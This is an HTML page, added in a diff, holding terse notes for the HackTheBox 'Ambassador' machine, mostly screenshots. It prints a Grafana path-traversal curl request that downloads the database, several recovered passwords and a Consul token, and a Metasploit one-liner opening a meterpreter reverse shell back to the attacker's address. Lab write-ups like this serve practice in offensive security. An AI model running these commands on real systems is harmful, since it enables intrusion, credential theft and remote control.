@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Ambassador · the-grizzly-bear</title>
+<meta name="description" content="Ambassador — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/ambassador/index.html" data-root="../../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../../index.html">HackTheBox</a> &rsaquo; <a href="../index.html">Completed Machines</a></div>
+<h1 id="title">Ambassador</h1>
+
+<p class="figure"><a class="img-link" href="untitled.png"><img src="untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-1.png"><img src="untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-2.png"><img src="untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-3.png"><img src="untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-4.png"><img src="untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-5.png"><img src="untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://www.exploit-db.com/exploits/50581" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/50581</a></p>
+<p>/usr/local/etc/grafana/grafana.ini</p>
+<p>$WORKING_DIR/conf/defaults.ini</p>
+<p class="figure"><a class="img-link" href="untitled-6.png"><img src="untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-7.png"><img src="untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-8.png"><img src="untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p>messageInABottle685427</p>
+<p class="figure"><a class="img-link" href="untitled-9.png"><img src="untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-10.png"><img src="untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p>finally downloaded</p>
+<p class="figure"><a class="img-link" href="untitled-11.png"><img src="untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p>dontStandSoCloseToMe63221!</p>
+<p>sudo curl --path-as-is <a href="http://10.129.51.239:3000/var/lib/grafana/grafana.db" target="_blank" rel="noopener">http://10.129.51.239:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db</a> -o grafana.db</p>
+<p>use plugin from list</p>
+<p class="figure"><a class="img-link" href="untitled-12.png"><img src="untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-13.png"><img src="untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-14.png"><img src="untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<p>YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==</p>
+<p>anEnglishManInNewYork027468</p>
+<p class="figure"><a class="img-link" href="untitled-15.png"><img src="untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-16.png"><img src="untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-17.png"><img src="untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-18.png"><img src="untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-19.png"><img src="untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p>consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD</p>
+<p class="figure"><a class="img-link" href="untitled-20.png"><img src="untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="untitled-21.png"><img src="untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<p>sudo msfconsole -q -x "use multi/misc/consul_service_exec; set payload linux/x86/meterpreter/reverse_tcp;set rhosts 127.0.0.1; set lhost 10.10.14.46; set acl_token bb03b43b-1d81-d62b-24b5-39540ee469b5; set lport 4444; exploit"</p>
+<p>ssh -L 8500:0.0.0.0:8500 <a href="mailto:developer@10.129.51.239">developer@10.129.51.239</a></p>
+<p class="figure"><a class="img-link" href="untitled-22.png"><img src="untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="insider-forensic-challenge.html"><strong>Insider(Forensic Challenge)</strong></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
